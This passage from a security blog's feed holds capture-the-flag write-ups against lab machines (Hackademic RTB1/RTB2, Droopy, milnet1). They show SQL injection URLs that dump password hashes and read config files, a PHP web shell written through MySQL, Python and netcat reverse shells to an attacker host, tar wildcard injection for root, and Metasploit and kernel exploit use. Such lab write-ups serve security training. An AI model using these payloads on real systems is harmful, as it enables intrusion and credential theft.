<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_025.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackademic RTB2]]></title>
    <link href="http://wg135.github.io/blog/2016/08/10/hackademic-rtb2/"/>
    <updated>2016-08-10T15:38:10-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/10/hackademic-rtb2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>Netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Joomscan</li>
<li>Metasploit</li>
</ul>


<h3>Vulnerabilities:</h3>

<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.158 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.158 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like port 80 is opening and port 666 is filtered.</p>

<p>Use both wfuzz to scan the host</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find <code>phpmyadmin</code></p>

<p>check the webpage, and need to login, try to use sqli to by pass the autherication, but doesn&rsquo;t work. Now step back, enumerate more.</p>

<p>I use nmap to scan the target again. find port 666 now is opening. So there may be a port knocking existing.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>use wfuzz scan again</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158:666/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>check the webpage <code>http://192.168.41.158:666/</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like it is joomla</p>

<p>now use Joomba to scan the app</p>

<p><code>joomscan -u http://192.168.41.158:666/</code></p>

<p>nothing cool comes out.</p>

<p>use metasploit</p>

<p><code>search joomla</code></p>

<p>I use <code>auxiliary/scanner/http/joomla_plugins</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/http/joomla_plugins
</span><span class='line'>msf auxiliary(joomla_plugins) &gt; set rhosts 192.168.41.158
</span><span class='line'>msf auxiliary(joomla_plugins) &gt; set rport 666
</span><span class='line'>msf auxiliary(joomla_plugins) &gt; run</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>use <code>/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>

<p>so first step, verify the sql injection:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>then try to get column number:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 1--</code>
<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 2--</code>
<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 3--</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>the column number is 2</p>

<p>next find out which column we can use</p>

<p><code>158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,2--</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Okay. Column 2</p>

<p>try to check mysql version</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,@@version--</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>get all table name</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, table_name from information_schema.tables--</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>get all column name of table jos_users</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, column_name from information_schema.columns where table_name = 'jos_users'--</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>next, get column username and password:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, concat(username,0x20,password) from jos_users--</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>The format is hash:salt</p>

<p>use my previous joomla hash crack script <a href="https://github.com/wg135/script/blob/master/crackjoomla.py">crackjoomla.py</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./crackjoomla.py 992396d7fc19fd76393f359cb294e300 70NFLkBrApLamH9VNGjlViJLlJsB60KF /usr/share/wordlists/rockyou.txt </span></code></pre></td></tr></table></div></figure>


<p>for administrator, I didn&rsquo;t get the password</p>

<p>for JSmith, password is matrix, for BTallor, password is victim.</p>

<p>login using JSmith, find nowhere can upload the webshell. check the configuration.php file</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, load_file('/var/www/configuration.php')--</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>find the username/password. Use it login phpmyadmin</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>now I will create a backdoor using mysql:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>create database pwn;
</span><span class='line'>create table backdoor(script text);
</span><span class='line'>insert into backdoor(script) values('&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); echo "&lt;/pre&gt;"; ?&gt;');
</span><span class='line'>select * into outfile "/var/www/backdoor3.php" from backdoor;</span></code></pre></td></tr></table></div></figure>


<p>check the backdoor.</p>

<p><code>http://192.168.41.158:666/backdoor3.php?cmd=uname -a</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p>good.</p>

<p>Setup netcat and</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.41.158:666/backdoor3.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p><code>uname -a</code></p>

<p>find the kernel version is 2.6.32. Find an exploit Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[hackademic:rtb1]]></title>
    <link href="http://wg135.github.io/blog/2016/08/03/hackademic-rtb1/"/>
    <updated>2016-08-03T10:30:58-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/03/hackademic-rtb1</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>Netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Wpscan</li>
</ul>


<h3>Vulnerabilities:</h3>

<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.157 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.157 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening.</p>

<p>Use both wfuzz and nikto to scan the host, nothing interesting&hellip;</p>

<p>Check the page,</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find a link <code>http://192.168.41.157/Hackademic_RTB1/</code></p>

<p>use wfuzz to scan:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.157/Hackademic_RTB1/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>There is a wordpress.</p>

<p>use wpscan to scan</p>

<p><code>wpscan http://192.168.41.157/Hackademic_RTB1/</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>There are a couple of exploits, I tried both of them and no luck.</p>

<p>Enumerate the page, find a possible SQL injection potint:</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0'</code></p>

<p>looks like parameter cat is vulnerable</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>next try:</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 1</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>keep trying until</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 6</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>got error. Now I know the current table in user by the vulnerable page has 5 columns.</p>

<p>next</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 union all select 1,2,3,4,5</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>now I can use second column to do injection.</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0%20union%20all%20select%201,@@version,3,4,5</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>next use sqlmap to get all tables,</p>

<p><code>sqlmap -u "http://192.168.41.157/Hackademic_RTB1/?cat=0" --dbms mysql --tables --level=5 --risk=3</code></p>

<p>get table names:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>I want to check table <code>wp_users</code></p>

<p><code>sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users  --columns</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>dump these two columns</p>

<p><code>sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users -C user_nickname,user_pass --dump</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>now we can edit php webshell via plugin</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>Only textile1.php can be updated. Use that file to edit shell.</p>

<p>Setup netcat, and load <code>http://192.168.41.157/Hackademic_RTB1/wp-content/plugins/textile1.php</code></p>

<p>get shell</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p><code>uname -a</code></p>

<p>get the <code>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</code></p>

<p>I tried serveral local exploits and find this one works:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>get the root:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Droopy:V0.2]]></title>
    <link href="http://wg135.github.io/blog/2016/08/01/droopy-v0-dot-2/"/>
    <updated>2016-08-01T10:57:14-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/01/droopy-v0-dot-2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Metasploit</li>
<li>droopescan</li>
</ul>


<h3>Vulnerabilities:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/34992/">Drupal HTTP Parameter Key/Value SQL Injection</a></li>
<li><a href="https://www.exploit-db.com/exploits/37292/">Linux Kernel 3.13.0 &lt; 3.19 &lsquo;overlayfs&rsquo; Local Root Shell</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.155 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.155 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening.</p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.41.155</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>No useful info come out.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.155/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>still same thing.</p>

<p>check the <a href="http://192.168.41.155">http://192.168.41.155</a></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Find the target use <code>Drupal</code></p>

<h3>Use Metasploit</h3>

<p>in msfconsole, search drupal, find an interesting exploit <code>exploit/multi/http/drupal_drupageddon</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/drupal_drupageddon
</span><span class='line'>msf exploit(drupal_drupageddon) &gt; set rhost 192.168.41.155
</span><span class='line'>msf exploit(drupal_drupageddon) &gt; exploit 
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>get meterpreter, do command <code>shell</code> to get shell.</p>

<p>use <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> get bash</p>

<p>user is www-data, next try to get root</p>

<p><code>uname -a</code></p>

<p><code>Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</code></p>

<p>the kernel is 3.1.30</p>

<p><code>searchsploit 3.1.30</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>upload the exploit, compile and run it, get the root:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<h3>Another way</h3>

<p>use droopescan to scan</p>

<p><code>droopescan scan drupal -u http://192.168.41.155/ -t 8</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>now I know the version is 7.30</p>

<p><code>searchsploit drupal</code></p>

<p>find the 34992.txt exploit works.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p><code>./34992.py -t http://192.168.41.155 -u test -p test</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>this exploit creates an admin account test/test, then in <code>Modules</code>, make sure the <code>PHP filter</code> is selected.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Also in <code>People</code> -> <code>Permissions</code>, check <code>Use the PHP code text format</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>In  <code>configuration</code> -> <code>Content authoring</code> -> <code>Text formats</code>,  need to check administrator box.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>Then create a new content (copy and paste reverse shell php code) and use PhP Code in the format, save it, then netcat will get the shell.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/drooy2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>Then use same method in the first part of this post to get the root.</p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[milnet1]]></title>
    <link href="http://wg135.github.io/blog/2016/07/28/milnet1/"/>
    <updated>2016-07-28T14:47:38-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/28/milnet1</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Tamper Data</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.154 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.154 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 22 and 80 are opening</p>

<p>use nmap to run http-enum script:</p>

<p><code>nmap 192.168.41.154 -p80 --script http-enum</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>The info.php file exists.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.41.154</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>use wfuzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.154/FUZZ 2&gt;/dev/null</code></p>

<p>nothing cool.</p>

<p>I use Tamper Data to exam the GET/POST request parameters.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>find an interesting parameter. setup a netcat listerner, and change the parameter value to <code>http://192.168.41.149/reverse?</code></p>

<p>(Here, at first I used reverse.php which created a local reverse shell back to my Kali. I guess there is a filter in target can filter php file, so I just remove .php)</p>

<p>get the shell:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>In order to make the process easier, I create a short script <a href="https://github.com/wg135/script/blob/master/send_post.py">send_post.py</a>:</p>

<figure class='code'><figcaption><span>send_post.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="c">#send post requst to the target</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">json</span>
</span><span class='line'>
</span><span class='line'><span class="n">url</span><span class="o">=</span> <span class="s">&#39;http://192.168.41.154/content.php&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>  <span class="s">&quot;Host&quot;</span> <span class="p">:</span> <span class="s">&quot;192.168.41.154&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s">&quot;User-Agent&quot;</span> <span class="p">:</span> <span class="s">&quot;Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s">&quot;Accept&quot;</span> <span class="p">:</span> <span class="s">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s">&quot;Accept-Language&quot;</span> <span class="p">:</span> <span class="s">&quot;en-US,en;q=0.5&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s">&quot;Accept-Encoding&quot;</span> <span class="p">:</span> <span class="s">&quot;gzip, deflate&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s">&quot;Referer&quot;</span> <span class="p">:</span> <span class="s">&quot;http://192.168.41.154/nav.php&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s">&quot;Connection&quot;</span> <span class="p">:</span> <span class="s">&quot;keep-alive&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s">&quot;Content-Type&quot;</span> <span class="p">:</span> <span class="s">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s">&quot;Content-Length&quot;</span> <span class="p">:</span> <span class="s">&quot;40&quot;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>  <span class="s">&quot;route&quot;</span> <span class="p">:</span> <span class="s">&quot;http://192.168.41.149/reverse?&quot;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next enumeration, no luck on kernerl exploit, check contab job.</p>

<p><code>cat /etc/cron*</code></p>

<p>got <code>/etc/crontab</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>read that file</p>

<p><code>cat /etc/crontab</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>found an interesting file: <code>/backup/backup.sh</code></p>

<p>check that file</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>it uses tar. Searched exploits, no luck.</p>

<p>Under path <code>/home/langman/SDINET</code>, I found a file <code>DefenseCode_Unix_WildCards_Gone_Wild.txt</code> shows tar cdode execution,</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>in kali:</p>

<p><code>nc -nlvp 443</code></p>

<p>in target:</p>

<figure class='code'><figcaption><span>send_post.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">echo</span> <span class="s">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.41.149 443 &gt; /tmp/f&quot;</span> <span class="o">&gt;</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span>
</span><span class='line'><span class="err">$</span> <span class="n">touch</span> <span class="s">&quot;/var/www/html/--checkpoint-action=exec=sh shell.sh&quot;</span>
</span><span class='line'><span class="err">$</span> <span class="n">touch</span> <span class="s">&quot;/var/www/html/--checkpoint=1&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>get the root:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/milnet1/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
</feed>
